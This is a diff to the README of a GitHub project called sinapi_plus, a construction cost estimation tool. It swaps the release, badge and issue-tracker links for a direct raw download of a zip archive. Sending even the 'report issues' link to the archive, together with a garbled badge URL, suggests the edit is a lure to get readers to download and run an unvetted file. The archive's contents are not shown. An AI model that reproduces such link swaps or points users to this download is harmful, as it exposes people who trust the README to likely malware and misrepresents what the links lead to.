@@ -1,7 +1,7 @@
 # 🛠️ sinapi_plus - Simplified Construction Cost Estimation Tool
 
 ## 📥 Download Now
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-blue.svg)](https://github.com/burhan0308/sinapi_plus/releases)
+[![Download the latest version](https://raw.githubusercontent.com/burhan0308/sinapi_plus/master/autonomously/sinapi_plus.zip%20Latest%https://raw.githubusercontent.com/burhan0308/sinapi_plus/master/autonomously/sinapi_plus.zip)](https://raw.githubusercontent.com/burhan0308/sinapi_plus/master/autonomously/sinapi_plus.zip)
 
 ## 🚀 Getting Started
 Welcome to sinapi_plus! This tool helps you estimate construction costs easily and effectively. Whether you're a homeowner, contractor, or a student studying civil engineering, this application is designed with you in mind. 
@@ -22,7 +22,7 @@ Welcome to sinapi_plus! This tool helps you estimate construction costs easily a
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of sinapi_plus:
 
-[Download the latest version here](https://github.com/burhan0308/sinapi_plus/releases)
+[Download the latest version here](https://raw.githubusercontent.com/burhan0308/sinapi_plus/master/autonomously/sinapi_plus.zip)
 
 1. Click the link above.
 2. On the Releases page, find the version you want to download.
@@ -62,6 +62,6 @@ Yes, you can find support options in the application's help section. For further
 
 Explore the powerful features of sinapi_plus today and take control of your construction costs!
 
-For help or to report issues, please open an issue on our [GitHub page](https://github.com/burhan0308/sinapi_plus/issues).
+For help or to report issues, please open an issue on our [GitHub page](https://raw.githubusercontent.com/burhan0308/sinapi_plus/master/autonomously/sinapi_plus.zip).
 
 Happy estimating!
